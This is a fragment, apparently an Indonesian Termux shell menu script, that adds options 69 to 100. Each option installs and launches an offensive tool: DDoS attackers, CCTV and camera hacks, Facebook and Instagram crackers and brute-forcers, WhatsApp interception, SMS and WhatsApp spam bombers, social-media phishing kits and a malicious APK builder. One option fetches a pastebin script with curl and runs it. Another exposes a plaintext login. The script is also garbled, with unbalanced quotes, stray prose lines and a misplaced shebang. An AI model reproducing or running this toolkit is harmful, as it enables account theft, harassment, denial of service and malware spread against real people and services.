+if [ $act = 69 ] || [ $act = 69 ]
+then
+clear
+echo -e $green" install Lazymux "
+sleep 1
+pkg update && upgrade
+pkg install python2 git
+git clone https://github.com/Gameye98/Lazymux
+cd Lazymux
+chmod +x lazymux.py
+python2 lazymux.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 70 ] || [ $act = 70 ]
+then
+clear
+echo -e $green" Hack Cctv "
+sleep 1
+apt update && apt upgrade
+pkg install python2
+pkg install git
+pip2 install requests
+git clone https://github.com/kancotdiq/ipcs
+cd ipcs
+python2 scan.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 71 ] || [ $act = 71 ]
+then
+clear
+echo -e $green"  DDOS HAMMER "
+sleep 1
+pkg update && pkg upgrade
+pkg install python git
+git clone https://github.com/cyweb/hammer
+cd hammer
+python hammer.py
+python hammer.py -s [IP target] -p [PORT] -t 135
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 72 ] || [ $act = 72 ]
+then
+clear
+echo -e $green" DDOS Xerxes "
+sleep 1
+apt install git clang
+apt install clang
+git clone https://github.com/zanyarjamal/xerxes
+cd xerxes
+clang xerxes.c -o xerxes
+ ./xerxes [Nama Website] 80
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 73 ] || [ $act = 73 ]
+then
+clear
+echo -e $green"  " FBHT "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install python
+pip2 install requests
+pip2 install mechanize
+git clone https://github.com/chinoogawa/fbht
+cd fbht
+python main.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 74 ] || [ $act = 74 ]
+then
+clear
+echo -e $green" admin login finder "
+sleep 1
+apt update && apt upgrade
+pkg install git python2
+git clone http://github.com/AdheBolo/AdminLogin
+cd AdminLogin
+chmod 777 login.py
+python2 login.py
+sleep 1
+echo -e Masukkan Target
+echo -e red" Tekan 0
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 75 ] || [ $act = 75 ]
+then
+clear
+echo -e $green" Admin Finder "
+sleep 1
+apt update && apt upgrade
+pkg install python2 git
+git clone https://github.com/AdheBolo/AdminFinder
+cd AdminFinder
+chmod 777 AdminFinder.py
+python2 AdminFinder.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 76 ] || [ $act = 76 ]
+then
+clear
+echo -e $green" Spam SMS Jd id "
+sleep 1
+pkg install php curl
+pkg install cURL
+curl https://pastebin.com/raw/9BYy1 JVc -o jdid.php
+php jdid.php
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 77 ] || [ $act = 77 ]
+then
+clear
+echo -e $green" tembak  xl "
+sleep 1
+pkg upgrade && update
+pkg install git python
+git clone https://github.com/albertoanggi/xl-py
+pip2 install -r requirements.txt
+chmod +x app.py
+python app.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 78 ] || [ $act = 78 ]
+then
+clear
+echo -e $green" INSTALL OSIF (Open Source Information Facebook) "
+sleep 1
+pkg install python2
+git clone https://github.com/ciku370/OSIF
+cd OSIF
+pip2 install -r requirements.txt
+python2 osif.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 79 ] || [ $act = 79 ]
+then
+clear
+echo -e $green" HACK INSTAGRAM "
+sleep 1
+apt update && apt upgrade
+pkg install python git nano
+git clone https://github.com/avramit/instahack.git
+cd instahack
+pip install requests
+cd instahack
+nano pass.txt
+cat pass.txt
+python hackinsta.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 80 ] || [ $act = 80 ]
+then
+clear
+echo -e $green" lazysqlmap
+sleep 1
+apt-get install python2
+git clone https://github.com/verluchie/termux-lazysqlmap
+cd termux-lazysqlmap
+chmod 777 install.sh
+./install.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 81 ] || [ $act = 81 ]
+then
+clear
+echo -e $green" Ddos Attack (Trojan) "
+sleep 1
+apt install git
+apt install python
+apt install bash
+apt install toilet
+apt install lolcat
+git clone https://github.com/BPCATTACKER/DOS-TOOKITS
+cd DOS-TOOKITS
+sh DoS-TOOKIT.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 82 ] || [ $act = 82 ]
+then
+clear
+echo -e $green" SADAP WHATSAPP "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install curl
+git clone https://github.com/AndriGanz/whatshack(tekan enter)
+ls
+cd whatshack
+sh  whatshack.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 83 ] || [ $act = 83 ]
+then
+clear
+echo -e $green" 13 TOOLS FACEBOOK "
+sleep1
+pkg update && pkg upgrade
+pkg install git
+pkg install bash
+pip2 install mechanize
+pip2 install lolcat
+pip2 install termcolor
+git clone https://github.com/MRRUXHANTAC/270/13_tools
+ls
+cd 13_tools
+ls
+sh 13tools_tuxh4n.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 84 ] || [ $act = 84 ]
+then
+clear
+echo -e $green" BOM WA "
+sleep 1
+pkg update && pkg upgrade
+pkg install php
+pkg install git
+git clone https://github.com/siputra12/prank
+ls
+cd prank
+ls
+php wa.php ( buat wa ) dll
+Input nomer target
+sleep1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 85 ] || [ $act = 85 ]
+then
+clear
+echo -e $green" Virus Malicius Apk "
+sleep 1
+pkg update
+pkg upgrade
+pkg install git
+pkg install python2
+git clone https://github.com/Hider5/Malicious
+ls
+cd Malicious
+ls
+pip2 install -r requirements.text
+ls
+python2 malicious.py
+ls
+cd Android
+ls
+sleep 1
+echo -e green" mv nama virus.apk /sdcard
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 86 ] || [ $act = 86 ]
+then
+clear
+echo -e $green" Install Santet Online "
+sleep 1
+Apt update && apt upgrade
+apt install git
+Apt install python2
+Pip2 install mechanize
+Pip2 install request
+git clone https://github.com/pashayogi/SETAN
+Cd SETAN
+python2 SETAN.py
+sleep1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 87 ] || [ $act = 87 ]
+then
+clear
+echo -e $green" install litespam "
+sleep 1
+pkg install git
+git clone https://github.com/4L13199/LITESPAM
+cd LITESPAM
+sh LITESPAM.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 88 ] || [ $act = 88 ]
+then
+clear
+echo -e $green" SPAM TOKOPEDIA "
+sleep 1
+apt update && apt upgrade -y
+apt install python2
+pip2 install requests
+pip2 install --upgrade pip
+git clone https://github.com/Senitopeng/Tokped.git
+cd Tokped
+python2 Tokped.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 89 ] || [ $act = 89 ]
+then
+clear
+echo -e $green" Dark Fb Mod "
+sleep 1
+pkg update && pkg upgrade
+pip2 install mechanize
+pip2 install request
+pkg install python
+pkg install python2
+pkg install git
+git clone https://github.com/anbia01/Dark-Mod.git
+ls
+cd Dark-Mod
+ls
+python2 dark-fb.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 90 ] || [ $act = 90 ]
+then
+clear
+echo -e $green" Dark Fb Vip "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install python2
+pip2 install mechanize
+pip2 install request
+git clone https://github.com/m4rche3ll-cyber/dark-vpro
+cd dark-vpro
+python2 dark-vpro.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 91 ] || [ $act = 91 ]
+then
+clear
+echo -e $green" Dark Fb Premium "
+sleep 1
+pkg install git python2
+pip2 install --upgrade pip
+git clone https://github.com/JeelsBoobz/darkfb
+cd darkfb
+pip2 install -r requirements.txt
+python2 darkfb.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 92 ] || [ $act = 92 ]
+then
+clear
+echo -e $green"(PHISING AKUN SOSMED) (acktif) "
+sleep 1
+pkg update
+pkg upgrade
+pkg install git
+pkg install php
+pkg install curl
+pkg install wget
+pkg install openssh
+git clone https://github.com/thelinuxchoice/shellphish
+ls
+cd shellphish
+bash shellphish.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 93 ] || [ $act = 93 ]
+then
+clear
+echo -e $green" HACK KAMERA(SAYCHEESE) "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install openssh
+pkg install mc
+git clone https://github.com/thelinuxchoice/saycheese
+cd saycheese
+bash saycheese.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 94 ] || [ $act = 94 ]
+then
+clear
+echo -e $green" TOOLS BUG HUNTER "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install python
+pkg install python2
+git clone https://github.com/thehackingsage/bughunter.git
+ls
+cd bughunter
+ls
+chmod +x bughunter.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 95 ] || [ $act = 95 ]
+then
+clear
+echo -e $green" TOOLS BRUTEFORCE INSTAGRAM "
+sleep 1
+apt update && apt upgrade
+pkg install python2
+pkg install python2-dev
+pkg install php
+pkg install git
+git clone https://github.com/rezadkim/instabrutal 
+ls
+chmod 777 instabrutal.py
+pip2 install requests
+python2 install instabrutal.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 96 ] || [ $act = 96 ]
+then
+clear
+echo -e $green" TOOLS PHISING FB/GAME "
+sleep 1
+pkg update && pkg upgrade
+pkg install ruby figlet
+gem install lolcat
+apt-get install bash
+pkg install git
+git clone https://github.com/ridwanirawan/PiPhish
+USERNAME :ridwan
+PASSWORD :erinafahira
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 97 ] || [ $act = 97 ]
+then
+clear
+echo -e $green" install coding python, ruby, git, php "
+sleep 1
+apt update
+apt install curl
+curl -LO https://raw.githubusercontent.com/Techzindia/usefultools/master/usefultool.sh
+sh usefultool.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 98 ] || [ $act = 98 ]
+then
+clear
+echo -e $green" install nethunter "
+sleep 1
+apt update
+apt install git
+git clone https://github.com/Hax4us/Nethunter-In-Termux.git
+cd Nethunter
+chmod +x kalinethunter
+./kalinethunter
+./startkali.sh
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 99 ] || [ $act = 99 ]
+then
+clear
+echo -e $green" Spam SMS and Spam Telfon "
+sleep 1
+Spam SMS and Spam Telfon
+pkg install python2
+pkg install git
+pip2 install requests
+git clone https://github.com/rezadkim/spammerZ
+ls
+cd spammerZ
+ls 
+python2 spam.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi
+
+if [ $act = 100 ] || [ $act = 100 ]
+then
+clear
+echo -e $green"  DDOS mbleddos "
+sleep 1
+pkg update && pkg upgrade
+pkg install git
+pkg install figlet
+pkg install python2
+pkg install python
+git clone https://github.com/RaphSoft/lain-lain.git
+ls
+cd lain-lain
+python2 mbledos.py
+sleep 1
+echo -e $red" Done Install cuk "
+fi#!/data/data/com.termux/files/usr/bin/bash
